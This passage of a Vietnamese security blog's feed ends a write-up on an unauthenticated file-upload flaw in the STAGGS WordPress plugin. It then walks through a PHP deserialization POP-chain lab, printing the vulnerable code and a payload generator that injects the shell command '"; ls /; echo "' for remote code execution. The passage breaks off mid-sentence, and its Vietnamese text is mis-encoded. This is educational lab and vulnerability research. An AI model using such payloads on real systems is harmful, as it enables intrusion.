width=&#34;1533&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE v·ªõi file upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng cho ph√©p &lt;strong&gt;unauthenticated&lt;/strong&gt; k·∫ª t·∫•n c√¥ng t·∫£i l√™n file t√πy √Ω (v√≠ d·ª• web shell) th√¥ng qua endpoint AJAX c·ªßa plugin STAGGS do thi·∫øu x√°c th·ª±c ki·ªÉu file tr∆∞·ªõc khi l∆∞u. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·∫•y &lt;code&gt;nonce&lt;/code&gt; t·ª´ m√£ ngu·ªìn c√¥ng khai, g·ª≠i &lt;code&gt;data:&lt;/code&gt; URI gi·∫£ m·∫°o (vd. &lt;code&gt;data:image/php;base64,...&lt;/code&gt;) v√† t·∫°o file PHP tr√™n m√°y ch·ªß, d·∫´n t·ªõi RCE. V·∫•n ƒë·ªÅ ƒë√£ ƒë∆∞·ª£c kh·∫Øc ph·ª•c trong phi√™n b·∫£n &lt;strong&gt;2.12.0&lt;/strong&gt; b·∫±ng c√°ch gi·ªõi h·∫°n ph·∫ßn m·ªü r·ªông ƒë∆∞·ª£c ch·∫•p nh·∫≠n (png, jpg, jpeg, gif).&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;L·ªó h·ªïng b·∫Øt ngu·ªìn t·ª´ &lt;strong&gt;kh√¥ng ki·ªÉm tra h·ª£p l·ªá ki·ªÉu/ƒëu√¥i file&lt;/strong&gt; tr∆∞·ªõc khi l∆∞u; ki·ªÉm tra client-side/regex kh√¥ng ƒë·ªß n·∫øu kh√¥ng r√†ng bu·ªôc ph·∫ßn m·ªü r·ªông v√† n·ªôi dung th·ª±c t·∫ø.&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng ƒë·ªÉ endpoint quan tr·ªçng cho ph√©p h√†nh ƒë·ªông upload ch·∫°y ·ªü ch·∫ø ƒë·ªô &lt;strong&gt;nopriv (unauthenticated)&lt;/strong&gt; n·∫øu kh√¥ng c√≥ c∆° ch·∫ø x√°c th·ª±c v√† h·∫°n ch·∫ø ch·∫∑t.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;nonce&lt;/code&gt; ch√®n trong m√£ ngu·ªìn c√≥ th·ªÉ b·ªã thu th·∫≠p v√† t√°i s·ª≠ d·ª•ng ‚Äî kh√¥ng d·ª±a ch·ªâ v√†o nonce hi·ªÉn th·ªã c√¥ng khai ƒë·ªÉ ngƒÉn thao t√°c nh·∫°y c·∫£m.&lt;/li&gt;&#xA;&lt;li&gt;C·∫ßn validate c·∫£ &lt;strong&gt;MIME type&lt;/strong&gt;, &lt;strong&gt;ph·∫ßn m·ªü r·ªông&lt;/strong&gt;, v√† (n·∫øu c√≥ th·ªÉ) ki·ªÉm tra n·ªôi dung th·ª±c t·∫ø c·ªßa file tr√™n server; l∆∞u file upload ·ªü v·ªã tr√≠ kh√¥ng th·ªÉ th·ª±c thi ho·∫∑c chuy·ªÉn ƒë·ªïi th√†nh non-executable.&lt;/li&gt;&#xA;&lt;li&gt;C·∫≠p nh·∫≠t plugin l√™n &lt;strong&gt;&amp;gt;= 2.12.0&lt;/strong&gt; ngay l·∫≠p t·ª©c; ki·ªÉm tra site cho c√°c file kh·∫£ nghi trong th∆∞ m·ª•c upload &lt;code&gt;staggs/&lt;/code&gt; n·∫øu site ch·∫°y phi√™n b·∫£n c≈©.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/staggs/vulnerability/wordpress-staggs-2-10-1-arbitrary-file-upload-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress STAGGS Plugin &amp;lt;= 2.11.0 is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>POP Chain Analysis &amp; Exploit</title>
      <link>http://localhost:1313/vi/posts/2025-11-11-pop-chain-lab1/</link>
      <pubDate>Tue, 11 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-11-pop-chain-lab1/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analyst/">CVE Analyst</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-11-pop-chain-lab1/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;intro&#34;&gt;&lt;span&gt;Intro&lt;/span&gt;&#xA;  &lt;a href=&#34;#intro&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Trong qu√° tr√¨nh nghi√™n c·ª©u &lt;strong&gt;Insecure Deserialization&lt;/strong&gt;, m√¨nh nh·∫≠n ƒë∆∞·ª£c m·ªôt lab li√™n quan ƒë·∫øn &lt;strong&gt;POP Chain&lt;/strong&gt; (Property-Oriented Programming Chain). ƒê√¢y l√† m·ªôt d·∫°ng t·∫•n c√¥ng th√∫ v·ªã: thay v√¨ khai th√°c h√†m hay l·ªánh tr·ª±c ti·∫øp, k·∫ª t·∫•n c√¥ng k·∫øt h·ª£p c√°c &lt;em&gt;gadget&lt;/em&gt; (c√°c ph∆∞∆°ng th·ª©c magic c·ªßa class) ƒë·ªÉ ƒë·∫°t ƒë∆∞·ª£c m·ª•c ti√™u ‚Äî v√≠ d·ª• th·ª±c thi l·ªánh h·ªá th·ªëng (RCE).&lt;/p&gt;&#xA;&lt;p&gt;B√†i vi·∫øt n√†y m√¥ t·∫£ qu√° tr√¨nh m√¨nh ph√¢n t√≠ch v√† khai th√°c lab: t·ª´ xem qua m√£ ngu·ªìn, nh·∫≠n di·ªán c√°c gadget h·ªØu d·ª•ng, t·ªõi c√°ch x√¢y payload ƒë·ªÉ k√≠ch ho·∫°t chu·ªói g·ªçi (POP chain). M·ª•c ti√™u l√† gi√∫p b·∫°n hi·ªÉu ƒë∆∞·ª£c ph∆∞∆°ng ph√°p t∆∞ duy khi x·ª≠ l√Ω lab ki·ªÉu n√†y.&lt;/p&gt;&#xA;&lt;p&gt;Lab m√¨nh th·ª±c hi·ªán:&#xA;&lt;a href=&#34;https://github.com/William957-web/POP-CHAIN-LAB1/blob/main/index.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/William957-web/POP-CHAIN-LAB1/blob/main/index.php&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;t·ªïng-quan-m√£-ngu·ªìn&#34;&gt;&lt;span&gt;T·ªïng quan m√£ ngu·ªìn&lt;/span&gt;&#xA;  &lt;a href=&#34;#t%e1%bb%95ng-quan-m%c3%a3-ngu%e1%bb%93n&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;class User{&#xA;&#x9;public $name;&#xA;&#x9;private $memo;&#xA;&#x9;function __construct($name){&#xA;&#x9;&#x9;$this-&amp;gt;name=$name;&#xA;&#x9;}&#xA;&#x9;function __wakeup(){&#xA;&#x9;&#x9;$this-&amp;gt;memo=new Note($this -&amp;gt; name.&amp;#34;say hello&amp;#34;, &amp;#39;test_whale&amp;#39;);&#xA;&#x9;}&#xA;&#x9;function __get($content){&#xA;&#x9;&#x9;return $this-&amp;gt;memo;&#xA;&#x9;}&#xA;}&#xA;class Note{&#xA;&#x9;public $content;&#xA;&#x9;public $whale;&#xA;&#x9;function __construct($content, $whale){&#xA;&#x9;&#x9;$this-&amp;gt;content=$content;&#xA;&#x9;&#x9;$this-&amp;gt;whale=$whale;&#xA;&#x9;}&#xA;&#x9;function __toString(){&#xA;&#x9;&#x9;$this-&amp;gt;record($this-&amp;gt;whale, $this-&amp;gt;content);&#xA;&#x9;&#x9;return &amp;#39;Record for &amp;#39;.$this-&amp;gt;whale.&amp;#39; is : &amp;#39;.$this-&amp;gt;content;&#xA;&#x9;}&#xA;&#x9;function record($whale, $content){&#xA;&#x9;&#x9;//check whether it&amp;#39;s an attribute&#xA;&#x9;&#x9;$test=$whale-&amp;gt;$content;&#xA;&#x9;&#x9;if ($test!=NULL){&#xA;&#x9;&#x9;&#x9;echo(&amp;#34;It&amp;#39;s probably an attribute&amp;#34;);&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;}&#xA;class Whale{&#xA;&#x9;public $name;&#xA;&#x9;private $note;&#xA;&#x9;function __construct($name){&#xA;&#x9;&#x9;$this-&amp;gt;name=$name;&#xA;&#x9;}&#xA;&#x9;function take_note($note){&#xA;&#x9;&#x9;$this-&amp;gt;note=date(&amp;#34;Y/m/d H:i:s&amp;#34;).$note;&#xA;&#x9;}&#xA;&#x9;function __get($attribute){&#xA;&#x9;&#x9;system(&amp;#39;echo &amp;#34;&amp;#39;.$this-&amp;gt;name.&amp;#39;&amp;#34; &amp;gt;&amp;gt; log.txt&amp;#39;);&#xA;&#x9;&#x9;return $this-&amp;gt;$attribute;&#xA;&#x9;}&#xA;&#x9;function __toString(){&#xA;&#x9;&#x9;return $this-&amp;gt;name;&#xA;&#x9;}&#xA;}&#xA;if (isset($_POST[&amp;#39;pop&amp;#39;])){&#xA;&#x9;unserialize(base64_decode($_POST[&amp;#39;pop&amp;#39;]));&#xA;}&#xA;?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;File ch√≠nh c√≥ ba class quan tr·ªçng: &lt;code&gt;User&lt;/code&gt;, &lt;code&gt;Note&lt;/code&gt;, &lt;code&gt;Whale&lt;/code&gt;. Cu·ªëi file c√≥ d√≤ng unserialize ƒë·∫ßu v√†o n·∫øu &lt;code&gt;$_POST[&#39;pop&#39;]&lt;/code&gt; ƒë∆∞·ª£c g·ª≠i:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (isset($_POST[&amp;#39;pop&amp;#39;])){&#xA;    unserialize(base64_decode($_POST[&amp;#39;pop&amp;#39;]));&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nh·ªØng ƒëi·ªÉm ƒë√°ng ch√∫ √Ω:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;D√≤ng &lt;strong&gt;8&lt;/strong&gt;: &lt;code&gt;User::__wakeup()&lt;/code&gt; t·∫°o m·ªôt &lt;code&gt;Note&lt;/code&gt; v√† g√°n v√†o &lt;code&gt;$this-&amp;gt;memo&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;D√≤ng &lt;strong&gt;23&lt;/strong&gt;: &lt;code&gt;Note::__toString()&lt;/code&gt; g·ªçi &lt;code&gt;record()&lt;/code&gt; r·ªìi tr·∫£ v·ªÅ m·ªôt chu·ªói.&lt;/li&gt;&#xA;&lt;li&gt;D√≤ng &lt;strong&gt;28&lt;/strong&gt;: &lt;code&gt;Note::record()&lt;/code&gt; truy xu·∫•t &lt;code&gt;$whale-&amp;gt;$content&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;D√≤ng &lt;strong&gt;44&lt;/strong&gt;: &lt;code&gt;Whale::__get()&lt;/code&gt; g·ªçi &lt;code&gt;system(&#39;echo &amp;quot;&#39;.$this-&amp;gt;name.&#39;&amp;quot; &amp;gt;&amp;gt; log.txt&#39;);&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;D√≤ng &lt;strong&gt;52&lt;/strong&gt;: v·ªã tr√≠ g·ªçi &lt;code&gt;unserialize(...)&lt;/code&gt; ‚Äî ƒëi·ªÉm t·∫•n c√¥ng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;lu·ªìng-th·ª±c-thi-d·∫´n-ƒë·∫øn-shell&#34;&gt;&lt;span&gt;Lu·ªìng th·ª±c thi d·∫´n ƒë·∫øn shell&lt;/span&gt;&#xA;  &lt;a href=&#34;#lu%e1%bb%93ng-th%e1%bb%b1c-thi-d%e1%ba%abn-%c4%91%e1%ba%bfn-shell&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Unserialize m·ªôt &lt;code&gt;User&lt;/code&gt;&lt;/strong&gt;: Khi unserialize m·ªôt object &lt;code&gt;User&lt;/code&gt;, magic method &lt;code&gt;__wakeup()&lt;/code&gt; s·∫Ω ch·∫°y. ·ªû ƒë√¢y &lt;code&gt;__wakeup()&lt;/code&gt; kh·ªüi t·∫°o m·ªôt &lt;code&gt;Note&lt;/code&gt; m·ªõi b·∫±ng c√°ch l·∫•y &lt;code&gt;$this-&amp;gt;name . &amp;quot;say hello&amp;quot;&lt;/code&gt; l√†m content v√† &lt;code&gt;&#39;test_whale&#39;&lt;/code&gt; l√†m whale:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;memo = new Note($this-&amp;gt;name . &amp;#34;say hello&amp;#34;, &amp;#39;test_whale&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;Note::__toString()&lt;/code&gt; s·∫Ω g·ªçi &lt;code&gt;record()&lt;/code&gt;&lt;/strong&gt;: &lt;code&gt;__toString()&lt;/code&gt; trong &lt;code&gt;Note&lt;/code&gt; g·ªçi &lt;code&gt;record($this-&amp;gt;whale, $this-&amp;gt;content)&lt;/code&gt; tr∆∞·ªõc khi tr·∫£ v·ªÅ chu·ªói. &lt;code&gt;__toString()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi khi ƒë·ªëi t∆∞·ª£ng b·ªã √©p sang chu·ªói. Ta l·ª£i d·ª•ng &lt;code&gt;$this-&amp;gt;name&lt;/code&gt; l√†m ƒë·ªëi t∆∞·ª£ng c·ªßa note s·∫Ω b·ªã √©p sang chu·ªói khi concat &lt;code&gt;&amp;quot;say hello&amp;quot;&lt;/code&gt; ·ªü d√≤ng 9.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;record()&lt;/code&gt; truy xu·∫•t thu·ªôc t√≠nh ƒë·ªông tr√™n &lt;code&gt;$whale&lt;/code&gt;&lt;/strong&gt;: Trong &lt;code&gt;record()&lt;/code&gt; c√≥ d√≤ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$test = $whale-&amp;gt;$content;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu &lt;code&gt;$whale&lt;/code&gt; l√† m·ªôt object &lt;code&gt;Whale&lt;/code&gt; v√† &lt;code&gt;$content&lt;/code&gt; kh√¥ng kh·ªõp thu·ªôc t√≠nh t·ªìn t·∫°i, PHP s·∫Ω g·ªçi magic &lt;code&gt;Whale::__get($attribute)&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;Whale::__get()&lt;/code&gt; th·ª±c thi &lt;code&gt;system()&lt;/code&gt;&lt;/strong&gt;: &lt;code&gt;__get()&lt;/code&gt; c·ªßa &lt;code&gt;Whale&lt;/code&gt; ch·ª©a:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;system(&amp;#39;echo &amp;#34;&amp;#39;.$this-&amp;gt;name.&amp;#39;&amp;#34; &amp;gt;&amp;gt; log.txt&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;V√¨ &lt;code&gt;system()&lt;/code&gt; ch·∫°y shell, n·∫øu &lt;code&gt;$this-&amp;gt;name&lt;/code&gt; ch·ª©a k√Ω t·ª± ph√° v·ª° l·ªánh (v√≠ d·ª• &lt;code&gt;&amp;quot;; ls /; echo &amp;quot;&lt;/code&gt;), attacker c√≥ th·ªÉ ch√®n v√† th·ª±c thi l·ªánh shell d·∫´n t·ªõi RCE.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;T·∫°o 1 file t∆∞∆°ng t·ª± file g·ªëc nh∆∞ng ch·ª©a code t·∫°o serialize:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;class User{&#xA;&#x9;public $name;&#xA;&#x9;private $memo;&#xA;&#x9;function __construct(){&#xA;&#x9;&#x9;$this-&amp;gt;name= new Note(&amp;#34;Top2&amp;#34;,new Whale((&amp;#39;&amp;#34;; ls /; echo &amp;#34;&amp;#39;)));&#xA;&#x9;}&#xA;&#x9;function __wakeup(){&#xA;&#x9;&#x9;$this-&amp;gt;memo=new Note($this -&amp;gt; name.&amp;#34;say hello&amp;#34;, &amp;#39;test_whale&amp;#39;);&#xA;&#x9;}&#xA;&#x9;function __get($content){&#xA;&#x9;&#x9;return $this-&amp;gt;memo;&#xA;&#x9;}&#xA;}&#xA;class Note{&#xA;&#x9;public $content;&#xA;&#x9;public $whale;&#xA;&#x9;function __construct($content, $whale){&#xA;&#x9;&#x9;$this-&amp;gt;content=$content;&#xA;&#x9;&#x9;$this-&amp;gt;whale=$whale;&#xA;&#x9;}&#xA;&#x9;function __toString(){&#xA;&#x9;&#x9;$this-&amp;gt;record($this-&amp;gt;whale, $this-&amp;gt;content);&#xA;&#x9;&#x9;return &amp;#39;Record for &amp;#39;.$this-&amp;gt;whale.&amp;#39; is : &amp;#39;.$this-&amp;gt;content;&#xA;&#x9;}&#xA;&#x9;function record($whale, $content){&#xA;&#x9;&#x9;//check whether it&amp;#39;s an attribute&#xA;&#x9;&#x9;$test=$whale-&amp;gt;$content;&#xA;&#x9;&#x9;if ($test!=NULL){&#xA;&#x9;&#x9;&#x9;echo(&amp;#34;It&amp;#39;s probably an attribute&amp;#34;);&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;}&#xA;class Whale{&#xA;&#x9;public $name;&#xA;&#x9;private $note;&#xA;&#x9;function __construct($name){&#xA;&#x9;&#x9;$this-&amp;gt;name=$name;&#xA;&#x9;}&#xA;&#x9;function take_note($note){&#xA;&#x9;&#x9;$this-&amp;gt;note=date(&amp;#34;Y/m/d H:i:s&amp;#34;).$note;&#xA;&#x9;}&#xA;&#x9;function __get($attribute){&#xA;&#x9;&#x9;system(&amp;#39;echo &amp;#34;&amp;#39;.$this-&amp;gt;name.&amp;#39;&amp;#34; &amp;gt;&amp;gt; log.txt&amp;#39;);&#xA;&#x9;&#x9;return $this-&amp;gt;$attribute;&#xA;&#x9;}&#xA;&#x9;function __toString(){&#xA;&#x9;&#x9;return $this-&amp;gt;name;&#xA;&#x9;}&#xA;}&#xA;&#xA;$u = new User();&#xA;$searialize = serialize($u);&#xA;echo base64_encode(&amp;#39;&amp;#39;. $searialize .&amp;#39;&amp;#39;);&#xA;?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ch·∫°y file n√†y v√† copy 